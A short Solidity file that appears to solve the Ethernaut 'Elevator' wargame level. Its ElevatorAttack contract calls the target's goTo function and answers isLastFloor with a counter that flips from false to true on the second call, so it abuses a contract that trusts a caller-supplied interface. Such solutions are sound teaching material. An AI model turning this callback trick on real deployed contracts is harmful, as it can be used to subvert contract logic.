// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    uint8 counter;

    function attack(address _targetAddress) public {
        IElevator elevator = IElevator(_targetAddress);

        elevator.goTo(31337);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        counter += 1;
        return counter == 2;
    }
}
